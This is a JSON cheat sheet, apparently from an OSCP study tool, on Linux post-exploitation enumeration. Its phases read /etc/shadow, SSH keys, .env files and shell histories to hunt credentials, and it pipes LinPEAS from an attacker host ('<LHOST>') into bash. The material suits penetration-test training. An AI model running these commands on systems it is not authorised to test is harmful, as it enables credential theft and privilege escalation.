{
  "cheatsheets": [
    {
      "id": "linux-enumeration-procedures",
      "name": "Linux Local Enumeration Procedures",
      "description": "Comprehensive Linux local enumeration methodology for privilege escalation reconnaissance. Based on OSCP methodology - covers situational awareness, user/group discovery, network enumeration, sensitive information hunting, shell artifacts, and automated tools.",
      "educational_header": {
        "how_to_recognize": [
          "You gained shell access on a Linux machine (reverse shell, SSH, web shell)",
          "Need to understand current privileges before attempting privilege escalation",
          "Looking for sensitive information, credentials, or privilege escalation vectors",
          "Machine could be standalone server, container, or part of larger network"
        ],
        "when_to_look_for": [
          "Immediately after gaining initial foothold on Linux target",
          "Before attempting any privilege escalation techniques",
          "When you need to understand system landscape for credential attacks",
          "During OSCP exam when compromising Linux standalone machines"
        ],
        "key_concepts": [
          "UID/GID Structure: UID 0 = root, UID 1000+ = regular users, GID determines group membership",
          "SUID/SGID Binaries: Programs running with owner's privileges, not caller's - key privesc vector",
          "Capabilities: Fine-grained privileges (CAP_SETUID, CAP_NET_BIND_SERVICE) that can lead to root",
          "sudo Configuration: /etc/sudoers defines who can run what as root - NOPASSWD is goldmine",
          "Cron Jobs: Scheduled tasks may run as root with writable scripts or path hijacking",
          "Cyclical Re-enumeration: After pivoting to a new user, RESTART sensitive file searches. Files that returned 'Permission denied' may now be readable. Each new user context expands your search scope."
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: Initial Shell - Complete Situational Awareness",
          "context": "You exploited a web vulnerability and got a reverse shell as user 'www-data' on a Linux server. You need to understand who you are, what system you're on, and what users exist before attempting privilege escalation.",
          "approach": "Run identity commands first (id, whoami, groups), then system info (uname, /etc/os-release), then user enumeration. This establishes complete situational awareness within 2-3 minutes. Focus on identifying users with shells and sudo access.",
          "commands": [
            "linux-id",
            "linux-hostname",
            "linux-uname",
            "linux-enum-users-shells",
            "linux-sudo-list"
          ],
          "expected_outcome": "You'll know: current user (www-data), hostname, kernel version for exploit research, all users with login shells (potential targets), and whether current user has any sudo privileges. This baseline enables targeted privilege escalation.",
          "why_this_works": "Built-in commands provide all this information without any tool uploads. Situational awareness prevents wasted time on attacks that won't work (e.g., kernel exploits on patched systems, sudo attacks without sudo access). Understanding user landscape reveals credential reuse opportunities."
        },
        {
          "title": "Scenario 2: User and Group Deep Dive",
          "context": "Initial enumeration revealed interesting users (admin, backup, mysql). You need to understand the full access picture: who has sudo rights, who owns important files, who has special group memberships.",
          "approach": "Enumerate /etc/passwd for all users, check /etc/group for security-relevant groups (sudo, adm, docker, lxd). Test sudo -l for current user. Check for password hashes in /etc/shadow if readable.",
          "commands": [
            "linux-cat-passwd",
            "linux-cat-group",
            "linux-sudo-check",
            "linux-check-shadow-readable"
          ],
          "expected_outcome": "Complete map of who has what access: 'admin is in sudo group', 'backup user has access to /opt/backups', 'mysql has database access'. This tells you which credentials to target and what access each credential would provide.",
          "why_this_works": "Group membership determines attack vectors. sudo group = potential root access. docker/lxd = container escape to root. adm = can read logs (credential hunting). Understanding these relationships prioritizes targets."
        },
        {
          "title": "Scenario 3: Sensitive Information Hunt",
          "context": "You know Apache, MySQL, and custom applications are running. Config files often contain plaintext credentials. Time to search for low-hanging fruit before attempting complex privilege escalation.",
          "approach": "Search for configuration files with credentials (.env, config.php, wp-config.php), SSH keys, history files, and application databases. Check common locations: /var/www, /opt, /home, /etc. Always search recursively.",
          "commands": [
            "linux-cred-discover-config",
            "linux-ssh-keys",
            "linux-find-env-files",
            "linux-find-config-files"
          ],
          "expected_outcome": "Potential finds: database credentials in config.php, SSH private keys in /home/user/.ssh, .env files with API keys or passwords, mysql history with queries containing passwords. Any of these could provide immediate privilege escalation.",
          "why_this_works": "Developers are lazy about credential security. Config files, .env files, and history files frequently contain plaintext credentials. Password reuse is extremely common - a MySQL password is often also the user's system password."
        },
        {
          "title": "Scenario 4: Shell History and Artifacts",
          "context": "The user has been using the shell. Administrators often type credentials directly into commands. History files persist even after session ends. Environment variables may contain secrets.",
          "approach": "Check .bash_history, .zsh_history for all users. Look for commands with passwords, mysql/ssh connections with credentials, environment variable exports. Check /var/log for authentication logs.",
          "commands": [
            "linux-bash-history",
            "linux-env-vars",
            "linux-mysql-history",
            "linux-auth-logs"
          ],
          "expected_outcome": "History files often contain: mysql -u root -pSecretPassword, sshpass -p 'password' ssh user@host, export DB_PASSWORD=secret. Auth logs show successful logins (timing attacks) and failed attempts (password hints).",
          "why_this_works": "Administrators misunderstand shell history. Commands with passwords are logged permanently. .bash_history survives logouts. Even after clearing history, .mysql_history and .psql_history may remain. Environment variables with secrets persist in memory and sometimes in files."
        },
        {
          "title": "Scenario 5: Automated Enumeration with LinPEAS",
          "context": "Manual enumeration found some interesting leads but you want comprehensive coverage. Before testing each vector individually, run LinPEAS for automated discovery of SUID binaries, capabilities, cron jobs, and misconfigurations.",
          "approach": "Transfer and run LinPEAS for automated discovery. Review findings focusing on RED/YELLOW highlights for privilege escalation vectors. Cross-reference with GTFOBins for exploitable binaries.",
          "commands": [
            "linux-linpeas",
            "linux-linpeas-http",
            "linux-suid-find",
            "linux-capabilities"
          ],
          "expected_outcome": "LinPEAS may reveal: SUID binaries exploitable via GTFOBins (python, vim, find), capabilities like cap_setuid, writable /etc/passwd, misconfigured cron jobs, kernel vulnerabilities. Combined with manual enumeration provides complete attack surface.",
          "why_this_works": "LinPEAS automates dozens of manual checks in minutes. While it may generate noise, it provides comprehensive overview. SUID + GTFOBins = instant root for many binaries. Capabilities are often overlooked but equally powerful."
        },
        {
          "title": "Scenario 6: Hidden in Plain View - Credential Pivot",
          "context": "You've compromised a low-privilege user (www-data) and identified config files and backup directories. Search for credentials, then pivot to a new user. After each pivot, restart the search with new permissions.",
          "approach": "Target application config files for database passwords, backup files for credentials, and world-readable home directories. Test found credentials by switching users or SSH. After pivoting, immediately re-enumerate - files that were permission-denied may now be readable.",
          "commands": [
            "linux-cred-discover-config",
            "linux-find-backup-files",
            "linux-su-user",
            "linux-ssh-keys"
          ],
          "expected_outcome": "Find cleartext credentials in config files (/var/www/html/config.php: 'password' => 'admin123'), backup files with old passwords, or readable SSH keys. Switch user with su or SSH, then restart enumeration. CRITICAL: After pivoting, previously denied files may be readable.",
          "why_this_works": "Permission errors during search indicate high-value files - note them for re-check after privilege escalation. The cyclical nature of enumeration means each new user access expands your search scope. Example: www-data -> developer (found password in config.php) -> root (found SSH key that developer could read but www-data couldn't)."
        }
      ],
      "sections": [
        {
          "title": "Phase 1: Identity and Context",
          "notes": "First commands after gaining shell access. Establishes who you are, your group memberships, and current capabilities. Check for immediate sudo access.",
          "commands": [
            {
              "id": "linux-id",
              "example": "id",
              "shows": "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
            },
            {
              "id": "linux-whoami",
              "example": "whoami",
              "shows": "www-data"
            },
            {
              "id": "linux-hostname",
              "example": "hostname",
              "shows": "webserver01"
            },
            {
              "id": "linux-sudo-list",
              "example": "sudo -l",
              "shows": "User www-data may run: (ALL) NOPASSWD: /usr/bin/vim"
            }
          ]
        },
        {
          "title": "Phase 2: User and Group Enumeration",
          "notes": "Identify all users and groups. Look for users with shells (bash, sh, zsh). Check security-relevant groups: sudo, adm, docker, lxd. Readable /etc/shadow is instant win.",
          "commands": [
            {
              "id": "linux-enum-users-shells",
              "example": "cat /etc/passwd | grep -v nologin | grep -v false",
              "shows": "root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000::/home/admin:/bin/bash"
            },
            {
              "id": "linux-cat-group",
              "example": "cat /etc/group | grep -E 'sudo|admin|docker|lxd|disk'",
              "shows": "sudo:x:27:admin\ndocker:x:998:developer"
            },
            {
              "id": "linux-check-shadow-readable",
              "example": "cat /etc/shadow 2>/dev/null | head -3",
              "shows": "root:$6$xyz...:18000:0:99999:7:::"
            },
            {
              "id": "linux-last-login",
              "example": "lastlog | grep -v 'Never'",
              "shows": "admin pts/0 192.168.1.10 Thu Dec 19 14:30"
            }
          ]
        },
        {
          "title": "Phase 3: System Information",
          "notes": "Understand OS version, kernel, and architecture. Critical for kernel exploit research and tool compatibility. Check for containers (docker, lxc).",
          "commands": [
            {
              "id": "linux-uname",
              "example": "uname -a",
              "shows": "Linux webserver01 5.4.0-42-generic #46-Ubuntu SMP x86_64 GNU/Linux"
            },
            {
              "id": "linux-os-release",
              "example": "cat /etc/os-release",
              "shows": "NAME=\"Ubuntu\" VERSION=\"20.04.1 LTS\" ID=ubuntu"
            },
            {
              "id": "linux-kernel-version",
              "example": "cat /proc/version",
              "shows": "Linux version 5.4.0-42-generic (buildd@lcy01-amd64-001)"
            },
            {
              "id": "linux-container-check",
              "example": "cat /proc/1/cgroup | grep -i docker",
              "shows": "12:devices:/docker/abc123... (indicates container)"
            }
          ]
        },
        {
          "title": "Phase 4: Network Enumeration",
          "notes": "Understand network position, identify listening services, discover internal hosts. Services bound to localhost may be exploitable. ARP cache reveals other hosts.",
          "commands": [
            {
              "id": "ip-addr",
              "example": "ip addr",
              "shows": "eth0: inet 192.168.1.100/24, eth1: inet 10.0.0.5/24"
            },
            {
              "id": "linux-ss-listen",
              "example": "ss -tulnp",
              "shows": "tcp LISTEN 0 128 127.0.0.1:3306 *:* users:((\"mysqld\",pid=1234))"
            },
            {
              "id": "linux-netstat",
              "example": "netstat -ano | grep ESTABLISHED",
              "shows": "tcp 0 0 192.168.1.100:22 192.168.1.50:54321 ESTABLISHED"
            },
            {
              "id": "linux-arp",
              "example": "arp -a",
              "shows": "gateway (192.168.1.1) at aa:bb:cc:dd:ee:ff [ether] on eth0"
            },
            {
              "id": "linux-hosts-file",
              "example": "cat /etc/hosts",
              "shows": "192.168.1.200 database.internal"
            }
          ]
        },
        {
          "title": "Phase 5: Applications and SUID/Capabilities",
          "notes": "Identify running processes and installed applications. SUID binaries and capabilities are primary privilege escalation vectors. Cross-reference with GTFOBins.",
          "commands": [
            {
              "id": "linux-ps-aux",
              "example": "ps aux | grep -v '\\[' | head -20",
              "shows": "root 1234 /usr/sbin/apache2, mysql 2345 /usr/sbin/mysqld"
            },
            {
              "id": "linux-suid-find",
              "example": "find / -perm -4000 -type f 2>/dev/null",
              "shows": "/usr/bin/sudo, /usr/bin/passwd, /usr/local/bin/custom-app"
            },
            {
              "id": "linux-capabilities",
              "example": "getcap -r / 2>/dev/null",
              "shows": "/usr/bin/python3.8 = cap_setuid+ep"
            },
            {
              "id": "linux-installed-packages",
              "example": "dpkg -l 2>/dev/null | head -30 || rpm -qa | head -30",
              "shows": "ii apache2 2.4.41 ii mysql-server 8.0"
            }
          ]
        },
        {
          "title": "Phase 6: Sensitive Information Discovery",
          "notes": "Search for password files, configuration files, SSH keys, and database credentials. Target web application directories, /opt, /home, /var. Note permission-denied files for re-check after privesc.",
          "commands": [
            {
              "id": "linux-find-config-files",
              "example": "find / -name '*.conf' -o -name '*.config' -o -name 'config.php' 2>/dev/null | head -30",
              "shows": "/var/www/html/config.php, /etc/mysql/my.cnf"
            },
            {
              "id": "linux-find-env-files",
              "example": "find / -name '.env' -o -name '*.env' 2>/dev/null",
              "shows": "/var/www/app/.env"
            },
            {
              "id": "linux-ssh-keys",
              "example": "find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' 2>/dev/null",
              "shows": "/home/admin/.ssh/id_rsa"
            },
            {
              "id": "linux-cred-discover-config",
              "example": "grep -r 'password' /var/www 2>/dev/null | grep -v Binary",
              "shows": "/var/www/html/config.php:$password = 'admin123';"
            },
            {
              "id": "linux-find-backup-files",
              "example": "find / -name '*.bak' -o -name '*.backup' -o -name '*.old' 2>/dev/null",
              "shows": "/var/backups/passwd.bak, /opt/app/config.php.old"
            }
          ]
        },
        {
          "title": "Phase 7: Shell Artifacts and History",
          "notes": "CRITICAL: Check history files for ALL users - they persist even after Clear-History! Contains credentials from all previous sessions. Also check environment variables for secrets.",
          "commands": [
            {
              "id": "linux-bash-history",
              "example": "cat ~/.bash_history 2>/dev/null; cat /home/*/.bash_history 2>/dev/null",
              "shows": "mysql -u root -pSecretPass123\nsshpass -p 'admin' ssh admin@192.168.1.50"
            },
            {
              "id": "linux-env-vars",
              "example": "env | grep -iE 'pass|key|secret|token|api'",
              "shows": "DB_PASSWORD=admin123\nAPI_KEY=sk-12345"
            },
            {
              "id": "linux-mysql-history",
              "example": "cat ~/.mysql_history 2>/dev/null",
              "shows": "ALTER USER 'root'@'localhost' IDENTIFIED BY 'newpassword';"
            },
            {
              "id": "linux-cron-enum",
              "example": "cat /etc/crontab; ls -la /etc/cron.*",
              "shows": "* * * * * root /opt/scripts/backup.sh"
            },
            {
              "id": "linux-auth-logs",
              "example": "cat /var/log/auth.log 2>/dev/null | tail -50",
              "shows": "Accepted password for admin from 192.168.1.50"
            }
          ]
        },
        {
          "title": "Phase 8: Automated Enumeration and Credential Testing",
          "notes": "Run LinPEAS for comprehensive automated enumeration. Review RED highlights for immediate privesc vectors. Test found credentials with su or SSH.",
          "commands": [
            {
              "id": "linux-linpeas",
              "example": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
              "shows": "RED highlights for SUID, capabilities, writable files, cron jobs..."
            },
            {
              "id": "linux-linpeas-http",
              "example": "curl http://<LHOST>/linpeas.sh | bash",
              "shows": "Running LinPEAS from attack machine web server"
            },
            {
              "id": "linux-su-user",
              "example": "su - admin",
              "shows": "Password: (enter found password)"
            },
            {
              "id": "linux-sudo-check",
              "example": "sudo -l",
              "shows": "User may run (ALL) NOPASSWD: /usr/bin/vim"
            }
          ]
        }
      ],
      "tags": [
        "LINUX",
        "ENUMERATION",
        "POST_EXPLOITATION",
        "PRIVILEGE_ESCALATION",
        "CREDENTIAL_HUNTING",
        "OSCP:HIGH"
      ],
      "oscp_relevance": "high"
    }
  ]
}
